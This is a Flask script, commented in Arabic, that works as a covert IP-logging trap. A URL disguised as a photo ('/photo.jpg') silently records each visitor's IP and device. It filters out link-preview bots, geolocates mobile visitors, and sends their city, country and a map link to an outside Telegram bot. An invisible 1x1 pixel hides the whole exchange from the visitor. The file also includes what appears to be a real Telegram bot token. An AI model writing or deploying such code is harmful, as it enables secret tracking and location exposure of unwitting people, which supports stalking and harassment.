from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

# --- إعدادات البوت (ضع بياناتك هنا) ---
TELEGRAM_TOKEN = "8459471902:AAHLHHniOWAQSDznm5TFWWmUzROr9cf_CUo"
CHAT_ID = "8524242091"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/photo.jpg') # جعل الرابط يبدو كصورة لخداع التطبيقات
@app.route('/')
def advanced_trap():
    # 1. الحصول على الـ IP الحقيقي وتجاوز البروكسي البسيط
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = request.headers.get('User-Agent', '')

    # 2. فحص هل الطلب من هاتف حقيقي (Android/iPhone) وليس بوت فحص
    is_mobile = any(os in ua.lower() for os in ['android', 'iphone', 'mobile'])
    is_bot = any(bot in ua.lower() for bot in ['facebook', 'vercel', 'bot', 'spider'])

    # 3. إذا كان جهازاً حقيقياً، اسحب البيانات الجغرافية
    if is_mobile and not is_bot:
        try:
            r = requests.get(f'http://ip-api.com/json/{ip}').json()
            report = (
                f"🌟 <b>ابتكار: صيد تلقائي متقدم!</b>\n\n"
                f"🌐 <b>IP:</b> <code>{ip}</code>\n"
                f"📍 <b>الموقع:</b> {r.get('city')}, {r.get('country')}\n"
                f"📱 <b>الجهاز:</b> <code>{ua[:60]}...</code>\n"
                f"📍 <a href='https://www.google.com/maps?q={r.get('lat')},{r.get('lon')}'>فتح الخريطة</a>"
            )
            send_to_telegram(report)
        except:
            pass

    # 4. إرجاع بكسل شفاف 1x1 لكي لا يظهر شيء للمستخدم (شفافية تامة)
    pixel = io.BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')
    return send_file(pixel, mimetype='image/png')

if __name__ == "__main__":
    app.run()
